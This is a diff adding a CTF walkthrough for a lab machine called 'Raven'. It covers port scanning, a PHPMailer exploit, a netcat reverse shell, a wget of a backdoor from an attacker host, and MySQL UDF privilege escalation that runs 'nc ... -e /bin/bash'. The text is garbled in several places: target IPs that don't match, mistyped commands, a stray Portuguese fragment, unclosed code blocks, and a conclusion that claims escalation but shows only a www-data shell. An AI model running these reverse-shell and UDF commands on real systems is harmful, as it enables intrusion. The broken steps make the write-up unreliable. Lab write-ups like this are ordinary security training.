@@ -1,1 +1,184 @@
 
+# CTF Walkthrough: Raven Machine
+
+
+
+## Machine Details
+- **Target IP:** 10.10.10.16
+- **Difficulty:** Medium
+- **Technologies:** 
+
+## 1. Setup Instructions
+- Prepare Kali Linux virtual machine
+- Configure network settings
+- Install necessary penetration testing tools
+  - nmap
+  - dirb
+  - searchsploit
+  - netcat
+  - python
+
+## 2. Reconnaissance (Recon)
+# Discover network hosts
+netdiscover -r 10.10.10.0/24
+
+
+### Network Scanning
+
+
+# Comprehensive port scanning
+nmap -sV -v -Pn 10.10.10.16
+nmap -sC -A -v -p- 10.10.10.16
+```
+
+### Scan Results
+
+PORT    STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5b
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+
+## 3. Enumeration
+
+### Web Directory Exploration
+
+```bash
+dirb http://10.10.10.16   -d /usr/share/wordlists/dirb/big.txt
+nikito -h http://10.10.10.16
+whatweb httpÇ//10.10.10.16
+curl http://10.10.10.16
+
+
+### Discovered Directories
+
+http://10.10.10.24/cgi-bin/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+curl http://10.10.10.24/cgi-bin/underworld
+ 11:09:26 up  2:41,  0 users,  load average: 0.00, 0.00, 0.00
+
+### Key Observations
+- `http://10.10.10.20/wordpress/wp-content/uploads/` contains a flag
+- `server-status` endpoint returns 403 Forbidden
+- curl http://10.10.10.24/cgi-bin/underworld - add no cgi o nome que aparece *Can you bust the underworld?*
+
+
+## 4. Vulnerability Identification
+
+
+### Initial Vulnerability Research
+```bash
+# Search for PHPMailer exploits
+searchsploit phpmailer
+
+# Copy specific exploit
+searchsploit -m 40974.py
+```
+
+### Exploit Preparation Notes
+⚠️ **Potential Installation Requirements**
+```bash
+# If requests_toolbelt module is missing
+pip3 install requests-toolbelt
+```
+
+## 5. Exploitation Techniques
+
+### Reverse Shell Establishment
+```bash
+# Set up listener on attacker machine
+nc -nlvp 443
+
+# Open backdoor in browser
+/path/to/backdoor
+
+# Upgrade to interactive shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### Initial Access
+```bash
+# Verify initial access
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# Change to temporary directory
+cd /tmp
+```
+
+### Data Transfer Techniques
+```bash
+# Simple HTTP server on attacker machine
+python -m http.server <port>
+
+# Download backdoor on target
+wget http://<attacker_ip>:<port>/backdoor
+```
+
+## 6. Privilege Escalation
+
+### MySQL Exploitation Method
+```sql
+# Select MySQL database
+use mysql
+
+# Create blob table
+CREATE TABLE bb (line BLOB);
+
+# Load malicious library
+INSERT INTO bb VALUES(LOAD_FILE('/tmp/mysql20.so'));
+
+# Move library to plugin directory
+SELECT * FROM bb INTO DUMPFILE '/usr/lib/mysql/plugin/mysql20.so';
+
+# Verify plugin directory
+SHOW VARIABLES LIKE 'plugin_dir';
+
+# Create system function
+CREATE FUNCTION do_system RETURNS INTEGER SONAME 'mysql20.so';
+
+# Execute reverse shell
+select do_system('nc 10.10.10.4 80 -e /bin/bash');
+```
+
+### Privilege Escalation Notes
+- Verify root processes
+```bash
+find ps -aux | grep root
+```
+
+## 7. Post-Exploitation
+- Maintained system access
+- Explored system information
+- Identified potential further exploitation paths
+
+## 8. Flag Collection
+- Check WordPress uploads directory
+- Search for flag files in various locations
+
+## 9. Conclusion
+- Successfully exploited MySQL functionality
+- Gained www-data shell
+- Demonstrated potential privilege escalation
+
+## 10. Recommendations
+- Update PHPMailer to latest version
+- Restrict MySQL plugin directory permissions
+- Implement stronger input validation
+
+## Appendix: Potential Challenges
+
+### Technical Challenges
+- Module compatibility issues
+- Precise exploit modification
+- Shell stabilization
+
+### Debugging Tips
+- Always verify module installations
+- Check full library paths
+- Use systematic exploitation approach
+
+## Author's Notes
+🔍 **Key Insights**
+- Exploit paths may require customization
+- Persistent testing is crucial
+- Always have backup exploitation strategies
